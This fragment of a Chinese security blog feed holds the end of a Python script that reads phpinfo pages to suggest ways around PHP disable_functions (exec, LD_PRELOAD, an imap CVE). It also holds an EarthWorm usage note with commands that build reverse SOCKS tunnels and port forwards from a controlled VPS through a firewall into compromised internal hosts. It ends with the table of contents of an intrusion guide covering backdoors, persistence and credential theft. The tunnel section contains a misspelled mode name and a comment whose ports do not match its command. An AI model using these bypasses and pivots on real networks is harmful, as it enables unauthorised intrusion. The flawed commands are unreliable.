&quot;php 7.2: assert从函数变为语法结构，无法动态调用; 移除create_function&quot;</span><br><span class="line">    if &quot;7.0&quot; in version:</span><br><span class="line">        suggestion = &quot;php 7.0: 移除dl; 不再支持asp_tag、&lt;script language=\&quot;php\&quot;&gt;&quot;</span><br><span class="line">    return suggestion</span><br><span class="line"></span><br><span class="line">#如果存在disable_function，寻找可能的bypass</span><br><span class="line">def bypass_disable_function(disable_func, phpinfo_dict):</span><br><span class="line">    disable_func = disable_func.split(&quot;,&quot;)</span><br><span class="line">    suggestion = &quot;&quot;</span><br><span class="line">    bypass_func = []</span><br><span class="line"></span><br><span class="line">    if &quot;dl&quot; not in disable_func and phpinfo_dict[&quot;Core&quot;][&quot;enable_dl&quot;] == &quot;On&quot;:</span><br><span class="line">        bypass_func.append(&quot;dl&quot;)</span><br><span class="line">    if &quot;pcntl_exec&quot; not in disable_func and &quot;--enable-pcntl&quot; in phpinfo_dict[&quot;Baseinfo&quot;][&quot;Configure Command&quot;]:</span><br><span class="line">        bypass_func.append(&quot;pcntl_exec&quot;)</span><br><span class="line">    common_funcs = [&apos;exec&apos;, &apos;system&apos;, &apos;passthru&apos;, &apos;popen&apos;, &apos;proc_open&apos;, &apos;shell_exec&apos;]</span><br><span class="line">    for func in common_funcs:</span><br><span class="line">        if func not in disable_func:</span><br><span class="line">            bypass_func.append(func)</span><br><span class="line">    suggestion += &quot;可用函数：&quot; + &quot;, &quot;.join(bypass_func) + &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">    if &quot;Linux&quot; in phpinfo_dict[&quot;Baseinfo&quot;][&quot;System&quot;] and &quot;putenv&quot; not in disable_func and &quot;mail&quot; not in disable_func:</span><br><span class="line">        suggestion += &quot;使用LD_PRELOAD https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n&quot;</span><br><span class="line">    if &quot;imap&quot; in phpinfo_dict:</span><br><span class="line">        suggestion += &quot;使用imap https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md\n&quot;</span><br><span class="line">    if &quot;imagemagick&quot; in phpinfo_dict:</span><br><span class="line">        suggestion += &quot;使用 ImageMagick\n&quot;</span><br><span class="line">    suggestion += &quot;disable function bypass合集 https://github.com/l3m0n/Bypass_Disable_functions_Shell&quot;</span><br><span class="line">    return suggestion</span><br><span class="line"></span><br><span class="line">def parse_phpinfo(url):</span><br><span class="line">    r = requests.get(url,verify=False)</span><br><span class="line">    #print(r.text)</span><br><span class="line">    html = BeautifulSoup(r.text, &quot;lxml&quot;)</span><br><span class="line">    phpinfo_dict = info_to_dict(html)</span><br><span class="line">    #pprint.pprint(phpinfo_dict)</span><br><span class="line">    print(get_important_info(phpinfo_dict))</span><br><span class="line">    print(get_parsed_info(phpinfo_dict))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    parse_phpinfo(url)</span><br></pre></td></tr></table></figure>

<p>requirements.txt文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests</span><br><span class="line">bs4</span><br><span class="line">tabulate</span><br><span class="line">wcwidth</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ew使用笔记</title>
    <url>/2020/06/22/ew%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="EW链路模式和参数"><a href="#EW链路模式和参数" class="headerlink" title="EW链路模式和参数"></a>EW链路模式和参数</h2><a id="more"></a><h3 id="六种链路状态："><a href="#六种链路状态：" class="headerlink" title="六种链路状态："></a>六种链路状态：</h3><p>ssocksd 正向本地 socks代理</p>
<p>rssocks 反向 socks代理（server） </p>
<p>rcsocks 反向 socks代理（client）</p>
<p>lcx_slave  将远程主机的端口 与 另一台主机的端口建立转发关系</p>
<p>lcx_tran  将本地端口转发至远程主机</p>
<p>lcx_listen 本地端口转发，本地端口之间建立转发关系</p>
<h3 id="参数信息："><a href="#参数信息：" class="headerlink" title="参数信息："></a>参数信息：</h3><p>-l 指定要监听的本地端口</p>
<p>-d 指定要反弹到的机器 ip</p>
<p>-e 指定要反弹到的机器端口</p>
<p>-f 指定要主动连接的机器 ip</p>
<p>-g 指定要主动连接的机器端口</p>
<p>-t 指定超时时长,默认为 1000</p>
<h2 id="socks隧道"><a href="#socks隧道" class="headerlink" title="socks隧道"></a>socks隧道</h2><h3 id="普通环境："><a href="#普通环境：" class="headerlink" title="普通环境："></a>普通环境：</h3><ol>
<li>目标网络边界存在公网IP且可任意开监听端口：（正向代理）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                      目标公网机器A</span><br><span class="line">+---------+    	  +-------------------+  </span><br><span class="line">|HackTools|  -&gt;&gt;  | 8888 -&gt; 1.1.1.1   |</span><br><span class="line">+---------+    	  +-------------------+</span><br></pre></td></tr></table></figure>
公网IP_A = 1.1.1.1 执行如下</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888   // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br></pre></td></tr></table></figure>
<p>HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</p>
<p>2.目标网络边界不存在公网 IP（能出网），需要通过反弹方式创建 socks 代理：（反向代理）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    自控公网VPS_IP                       可控边界主机A</span><br><span class="line">+---------+     +--------------------------+    |     	+-------------+</span><br><span class="line">|HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙 	| &lt;- 2.2.2.2  |</span><br><span class="line">+---------+     +--------------------------+    |    	+-------------+</span><br></pre></td></tr></table></figure>
<p>VPS_IP = 1.1.1.1 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888  //在 1.1.1.1 的自控公网VPS主机上添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br></pre></td></tr></table></figure>
<p>内网IP_A =2.2.2.2 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s rssocks -d 1.1.1.1 -e 8888  //将目标网络的可控边界主机A反向连接自控公网VPS主机的8888端口</span><br></pre></td></tr></table></figure>
<p>HackTools 可通过访问 1.1.1.1:1080 端口使用 2.2.2.2 主机提供的 socks5 代理服务</p>
<h3 id="对于二重网络环境："><a href="#对于二重网络环境：" class="headerlink" title="对于二重网络环境："></a>对于二重网络环境：</h3><p>1.获得目标网络内网两台主机 A、B 的权限，情况描述如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    可控边界主机A                 可访问指定资源的内网主机B</span><br><span class="line">+---------+    	 +-----------------------+     	 +-----------------+</span><br><span class="line">|HackTools| -&gt;&gt;  | 1080 --&gt;  1.1.1.1 --&gt; | 	-&gt;&gt;  | 9999 -&gt; 2.2.2.2 |</span><br><span class="line">+---------+      +-----------------------+     	 +-----------------+</span><br></pre></td></tr></table></figure>
<p>A 主机：  存在公网 IP和内网IP，且自由监听任意端口，无法访问特定资源</p>
<p>B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</p>
<p>A 主机可直连 B 主机</p>
<p>内网IP_B =2.2.2.2 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999  // 在 2.2.2.2 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br></pre></td></tr></table></figure>
<p>边界IP_A = 1.1.1.1 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f 2.2.2.2 -g 9999  // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.2 的主机。</span><br></pre></td></tr></table></figure>
<p>HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.2 主机提供的 socks5 代理。</p>
<p>2.获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                   	自控公网VPS_IP                       可控边界主机A       	     可访问指定资源的主机B</span><br><span class="line">+---------+   	 +--------------------------+     |    +-----------------+     	 +-----------------+</span><br><span class="line">|HackTools|  -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 3.3.3.3 |</span><br><span class="line">+---------+ 	 +--------------------------+     |    +-----------------+     	 +-----------------+</span><br></pre></td></tr></table></figure>
<p>A 主机：  目标网络的边界主机，无公网 IP，有内网IP（可出网），但无法访问特定资源。</p>
<p>B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网</p>
<p>A 主机可直连 B 主机</p>
<p>VPS_IP= 1.1.1.1 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888  // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br></pre></td></tr></table></figure>
<p>边界IP_A= 2.2.2.2 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 3.3.3.3 -g 9999  // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 3.3.3.3:9999 之间的通讯隧道</span><br></pre></td></tr></table></figure>
<p>内网IP_B= 3.3.3.3 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999 // 在 3.3.3.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br></pre></td></tr></table></figure>
<p>HackTools 可通过访问 1.1.1.1:1080 来使用 3.3.3.3 主机提供的 socks5 代理</p>
<h3 id="对于三重网络环境"><a href="#对于三重网络环境" class="headerlink" title="对于三重网络环境"></a>对于三重网络环境</h3><p>2.获得目标网络内两台主机 A、B 、C的权限，情况描述如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                   	自控公网VPS_IP                       可控边界主机A       	       可控内网主机B           可访问指定资源的主机C</span><br><span class="line">+---------+   	 +--------------------------+     |    +-----------------+     	 +----------------------+      +------------+</span><br><span class="line">|HackTools|  -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 7777 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt;  | 8888 -&gt; 3.3.3.3 -&gt;9999| -&gt;&gt; | &lt;- 4.4.4.4  |</span><br><span class="line">+---------+ 	 +--------------------------+     |    +-----------------+     	 +----------------------+      +------------+</span><br></pre></td></tr></table></figure>

<p>A 主机：  目标网络的边界主机，无公网 IP，有内网IP（可出网），但无法访问特定资源。</p>
<p>B 主机：  目标网络内部主机，不能访问外网，但可被A主机访问。</p>
<p>C 主机：  目标网络内部主机，不能访问外网，可访问核心区域，可被B主机访问。</p>
<p>VPS_IP= 1.1.1.1 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 7777  // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 7777 端口的主机</span><br></pre></td></tr></table></figure>
<p>边界IP_A= 2.2.2.2 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 7777 -f 3.3.3.3 -g 8888  // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 3.3.3.3:9999 之间的通讯隧道</span><br></pre></td></tr></table></figure>
<p>内网IP_B= 3.3.3.3 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_listen -l 8888 -e 9999 // 在 3.3.3.3 上将8888收到的代理请求转发给9999端口</span><br></pre></td></tr></table></figure>
<p>内网IP_C= 4.4.4.4 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s rscoscks -d 3.3.3.3 -e 9999 // 在 4.4.4.4上启动socks服务，并反弹到B主机的9999端口</span><br></pre></td></tr></table></figure>
<p>HackTools 可通过访问 1.1.1.1:1080 来使用 4.4.4.4 主机提供的 socks5 代理</p>
<h3 id="socks代理工具"><a href="#socks代理工具" class="headerlink" title="socks代理工具"></a>socks代理工具</h3><p>windows：SocksCap64<br>linux：ProxyChains</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="正向转发："><a href="#正向转发：" class="headerlink" title="正向转发："></a>正向转发：</h3><p>拥有公网IP和内网IP的双网卡边界主机A和内网主机B=1.1.1.1在同一个内网</p>
<p>边界主机A 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_tran -l 33890 -f 1.1.1.1 -g 3389</span><br></pre></td></tr></table></figure>
<p>连接A的33890端口即可连接内网B的3389</p>
<h3 id="反向转发："><a href="#反向转发：" class="headerlink" title="反向转发："></a>反向转发：</h3><p>自控VPS_IP=1.1.1.1 执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_listen -l 3380 -e 33890</span><br></pre></td></tr></table></figure>
<p>可出网边界主机B=2.2.2.2 执行如下，内网不出网机器C=3.3.3.3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 33890 -f 3.3.3.3 -g 3389</span><br></pre></td></tr></table></figure>
<p>连接自控VPS_IP主机的3380端口即可访问C机器的3389</p>
<h4 id="值得注意的问题："><a href="#值得注意的问题：" class="headerlink" title="值得注意的问题："></a>值得注意的问题：</h4><p>如上环境和命令，区别为可出网边界主机B=2.2.2.2为本地win10，内网不出网机器C=3.3.3.3为虚拟机win7<br>发现不能通过自控VPS_IP主机的3380端口连接win7的3389，疑似为win7在虚拟机中登录后占用了“本地”“连接”“本地远程桌面”的会话（单用户模式？）</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全Tips</title>
    <url>/2020/06/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8Tips/</url>
    <content><![CDATA[<p> Author: <a href="https://twitter.com/Evi1cg" target="_blank" rel="noopener">Evi1cg</a><br> Blog: <a href="https://evi1cg.github.io" target="_blank" rel="noopener">https://evi1cg.github.io</a></p><a id="more"></a>
<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><ul>
<li><a href="#%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86osint">开源情报信息收集（OSINT）</a><ul>
<li><a href="#github">github</a></li>
<li><a href="#whois%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E4%BA%BA%E5%8F%8D%E6%9F%A5%E9%82%AE%E7%AE%B1%E5%8F%8D%E6%9F%A5%E7%9B%B8%E5%85%B3%E8%B5%84%E4%BA%A7">whois查询/注册人反查/邮箱反查/相关资产</a></li>
<li><a href="#google-hacking">google hacking</a></li>
</ul>
</li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8">创建企业密码字典</a><ul>
<li><a href="#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8">字典列表</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96">邮箱列表获取</a></li>
<li><a href="#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2">泄露密码查询</a></li>
<li><a href="#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86">对企业外部相关信息进行搜集</a><ul>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96">子域名获取</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91">进入内网</a><ul>
<li><a href="#%E5%9F%BA%E4%BA%8E%E4%BC%81%E4%B8%9A%E5%BC%B1%E8%B4%A6%E5%8F%B7%E6%BC%8F%E6%B4%9E">基于企业弱账号漏洞</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5">基于系统漏洞进入</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F">网站应用程序渗透</a></li>
<li><a href="#%E6%97%A0%E7%BA%BFwi-fi%E6%8E%A5%E5%85%A5">无线Wi-Fi接入</a></li>
</ul>
</li>
<li><a href="#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB">隐匿攻击</a><ul>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#fronting">Fronting</a></li>
<li><a href="#%E4%BB%A3%E7%90%86">代理</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8">内网跨边界应用</a><ul>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91">内网跨边界转发</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F">内网跨边界代理穿透</a><ul>
<li><a href="#ew">EW</a></li>
<li><a href="#termite">Termite</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC">代理脚本</a></li>
</ul>
</li>
<li><a href="#shell%E5%8F%8D%E5%BC%B9">shell反弹</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD">内网文件的传输和下载</a></li>
<li><a href="#%E6%90%AD%E5%BB%BA%20HTTP%20server">搭建 HTTP server</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">内网信息搜集</a><ul>
<li><a href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">本机信息搜集</a><ul>
<li><a href="#1%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">1、用户列表</a></li>
<li><a href="#2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8">2、进程列表</a></li>
<li><a href="#3%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8">3、服务列表</a></li>
<li><a href="#4%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">4、端口列表</a></li>
<li><a href="#5%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8">5、补丁列表</a></li>
<li><a href="#6%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB">6、本机共享</a></li>
<li><a href="#7%E6%9C%AC%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF%E5%88%86%E6%9E%90">7、本用户习惯分析</a></li>
<li><a href="#8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7">8、获取当前用户密码工具</a><ul>
<li><a href="#windows">Windows</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">扩散信息收集</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">常用端口扫描工具</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90">内网拓扑架构分析</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4">常见信息收集命令</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">第三方信息收集</a></li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
<li><a href="#windows-1">Windows</a><ul>
<li><a href="#bypassuac">BypassUAC</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95">常用方法</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7">常用工具</a></li>
</ul>
</li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
</ul>
</li>
<li><a href="#linux-1">Linux</a><ul>
<li><a href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83">内核溢出提权</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li>
<li><a href="#suid">SUID</a></li>
<li><a href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E">系统服务的错误权限配置漏洞</a></li>
<li><a href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE">不安全的文件/文件夹权限配置</a></li>
<li><a href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81">找存储的明文用户名，密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a><ul>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8">系统后门</a><ul>
<li><a href="#windows-2">Windows</a><ul>
<li><a href="#1%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7">1、密码记录工具</a></li>
<li><a href="#2%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8payload%E4%BD%8D%E7%BD%AE">2、常用的存储Payload位置</a></li>
<li><a href="#3runrunonce-keys">3、Run/RunOnce Keys</a></li>
<li><a href="#4bootexecute-key">4、BootExecute Key</a></li>
<li><a href="#5userinit-key">5、Userinit Key</a></li>
<li><a href="#6startup-keys">6、Startup Keys</a></li>
<li><a href="#7services">7、Services</a></li>
<li><a href="#8browser-helper-objects">8、Browser Helper Objects</a></li>
<li><a href="#9appinit_dlls">9、AppInit_DLLs</a></li>
<li><a href="#10%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94">10、文件关联</a></li>
<li><a href="#11bitsadmin">11、bitsadmin</a></li>
<li><a href="#12mof-">12、mof </a></li>
<li><a href="#13wmi">13、wmi</a></li>
<li><a href="#14userland-persistence-with-scheduled-tasks">14、Userland Persistence With Scheduled Tasks</a></li>
<li><a href="#15netsh">15、Netsh</a></li>
<li><a href="#16shim">16、Shim</a></li>
<li><a href="#17dll%E5%8A%AB%E6%8C%81">17、DLL劫持</a></li>
<li><a href="#18doubleagent-">18、DoubleAgent </a></li>
<li><a href="#19waitforexe-">19、waitfor.exe </a></li>
<li><a href="#20appdomainmanager">20、AppDomainManager</a></li>
<li><a href="#21office">21、Office</a></li>
<li><a href="#22clr">22、CLR</a></li>
<li><a href="#23msdtc">23、msdtc</a></li>
<li><a href="#24hijack-caccpropservicesclass-and-mmdeviceenumerato">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</a></li>
<li><a href="#25hijack-explorerexe">25、Hijack explorer.exe</a></li>
<li><a href="#26windows-fax-dll-injection">26、Windows FAX DLL Injection</a></li>
<li><a href="#27%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC">27、特殊注册表键值</a></li>
<li><a href="#28%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8">28、快捷方式后门</a></li>
<li><a href="#29logon-scripts">29、Logon Scripts</a></li>
<li><a href="#30password-filter-dll">30、Password Filter DLL</a></li>
<li><a href="#31%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">31、利用BHO实现IE浏览器劫持</a></li>
</ul>
</li>
<li><a href="#linux-2">Linux</a><ul>
<li><a href="#crontab">crontab</a></li>
<li><a href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd">硬链接sshd</a></li>
<li><a href="#ssh-server-wrapper">SSH Server wrapper</a></li>
<li><a href="#ssh-keylogger">SSH keylogger</a></li>
<li><a href="#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor">Cymothoa_进程注入backdoor</a></li>
<li><a href="#rootkit">rootkit</a></li>
<li><a href="#tools">Tools</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#web%E5%90%8E%E9%97%A8">WEB后门</a></li>
</ul>
</li>
<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F">端口渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1">端口扫描</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">端口爆破</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4">端口弱口令</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%BA%A2%E5%87%BA">端口溢出</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3">常见的默认端口</a><ul>
<li><a href="#1web%E7%B1%BBweb%E6%BC%8F%E6%B4%9E%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95">1、web类(web漏洞/敏感目录)</a></li>
<li><a href="#2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4">2、数据库类(扫描弱口令)</a></li>
<li><a href="#3%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB%E6%BC%8F%E6%B4%9E">3、特殊服务类(未授权/命令执行类/漏洞)</a></li>
<li><a href="#4%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">4、常用端口类(扫描弱口令/端口爆破)</a></li>
<li><a href="#5%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1">5、端口合计所对应的服务</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1">信息搜集</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95">获取域控的方法</a><ul>
<li><a href="#sysvol">SYSVOL</a></li>
<li><a href="#ms14-068-kerberos">MS14-068 Kerberos</a></li>
<li><a href="#spn%E6%89%AB%E6%8F%8F">SPN扫描</a></li>
<li><a href="#kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8">Kerberos的黄金门票</a></li>
<li><a href="#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1">Kerberos的银票务</a></li>
<li><a href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3">域服务账号破解</a></li>
<li><a href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83">凭证盗窃</a></li>
<li><a href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a></li>
</ul>
</li>
<li><a href="#%E8%8E%B7%E5%8F%96ad%E5%93%88%E5%B8%8C">获取AD哈希</a></li>
<li><a href="#ad%E6%8C%81%E4%B9%85%E5%8C%96">AD持久化</a><ul>
<li><a href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7">活动目录持久性技巧</a></li>
<li><a href="#security-support-provider">Security Support Provider</a></li>
